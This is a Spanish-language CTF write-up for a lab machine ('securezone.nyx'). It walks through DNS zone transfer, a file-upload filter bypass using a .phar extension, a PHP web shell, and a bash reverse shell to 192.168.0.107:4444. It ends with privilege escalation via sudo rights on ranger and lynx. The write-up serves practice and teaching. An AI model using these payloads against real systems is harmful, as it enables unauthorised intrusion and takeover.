---
tags:
  - CTF
  - CyberSec
---
# Reconocimiento y enumeración
Con `arp-scan` podemos ver que el IP objetivo es `192.168.0.110`. Si hacemos el escaneo con nmap obtenemos.
![](_anexos_/Screenshot%20from%202023-12-26%2020-21-31.png)
- Si ingresamos a la pagina web en puerto 80, nos sale la pagina por defecto de apache.
- `whatweb` no detecta nada que pueda resultar interesante.

Si hacemos fuzzing a la maquina, `dirb` encuentra una ruta interesante.`Gobuster` parece no detectar nada.

![](_anexos_/Screenshot%20from%202023-12-26%2020-25-48.png)
En `robots.txt` encontramos este dominio el cual asociamos a la IP en `/etc/hosts`.

![](_anexos_/Screenshot%20from%202023-12-26%2020-41-42.png)

Como tenemos el puerto 53 del servicio `DNS` abierto. Podemos tratar de hacer una enumeración con el dominio que encontramos en `robots.txt` haciendo uso de `dig`.

``` bash
dig axfr @192.168.0.110 securezone.nyx
```

![](_anexos_/Screenshot%20from%202023-12-26%2020-31-50.png)

Vinculamos todos los dominios a la IP `192.168.0.110`. Si ingresamos a `upl0ads.securezone.nyx` nos encontramos con esto. 

![](_anexos_/Screenshot%20from%202023-12-26%2022-30-07.png)

# Burpsuite y file upload

Ingresamos un archivo `hola.txt` de prueba mientras interceptamos la petición con Burpsuite a través del proxy ya configurado.

![](_anexos_/Screenshot%20from%202023-12-26%2022-33-17.png)

Si pasamos al `repeater` y enviamos la petición, podemos ver que nuestro archivo es denegado. Al parecer existe una serie de archivos permitidos para la carga.
Entonces, procedemos a enviar la petición al `intruder` y lanzar un ataque de tipo `sniper` para probar diferentes extensiones `.php`, lista la cual se toma de [este](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) repositorio. 

![](_anexos_/Screenshot%20from%202023-12-26%2022-37-21.png)

> Importante: desactivar el URL-encode al momento del ataque para que no cambie los caracteres especiales de las extensiones como `dot`.

![](_anexos_/Screenshot%20from%202023-12-26%2022-38-09.png)
![](_anexos_/Screenshot%20from%202023-12-26%2022-38-09.png)

Por ultimo agregamos el codigo php malicioso que nos debería permitir hacer una reverse shell.

``` bash
<?php system($_REQUEST["cmd"]); ?>
```

![](_anexos_/Screenshot%20from%202023-12-26%2022-43-22.png)

Luego de ejecutar el ataque `sniper`, en los resultados podemos ver tres tipos de tamaños diferentes en el request.
- 810: descartados, todas estas son denegadas
- 809: en duda, no probados
- 795: solo un archivo tiene este `length`.
Podemos ver que ese archivo de tamaño 795 es una que tiene la extensión `.phar`.

![](_anexos_/Screenshot%20from%202023-12-27%2000-04-53.png)

Si hacemos fuzzing al dominio `upl0ads.securezone.nyx` encontramos una `/uploads` ruta.
Entonces, ingresamos pero nos tira un `403 forbidden`, lo que si podemos ingresar con la ruta del archivo, en este caso `hola`, si recordamos el `hola.txt` que subimos antes. 

``` bash
http://upl0ads.securezone.nyx/uploads/hola.phar

## Haciendo uso de cmd
http://upl0ads.securezone.nyx/uploas/hola.phar?cmd=id
```

![](_anexos_/Screenshot%20from%202023-12-27%2000-20-16.png)

Procedemos a generar la reverse shell:
``` bash
bash -c "bash -i >& /dev/tcp/192.168.0.107/4444 0>&1"
```

![](_anexos_/Screenshot%20from%202023-12-27%2000-25-03.png)

# Privesc
Si ejecutamos `sudo -l`. Podemos ver que nos permite ejecutar `ranger` como el usuario `hans`. Aprovechamos esto para poder capturar el `id_rsa` y conectarnos a través de ssh. En este caso no es necesario usar herramientas como `john` para crackear la contraseña porque en realidad no esta configurada ninguna. 

![](_anexos_/Screenshot%20from%202023-12-27%2000-49-38.png)

Al ejecutar nuevamente `sudo -l` (esta vez como el usuario `hans`). Podemos ver que podemos ejecutar como root, el navegador por terminal `lynx`. Si entramos al navegador y miramos entre las opciones podemos encontrar.

![](_anexos_/Screenshot%20from%202023-12-27%2000-59-05.png)

Presionamos `!` y ya estamos dentro como el usuario root.

![](_anexos_/Screenshot%20from%202023-12-27%2001-00-08.png)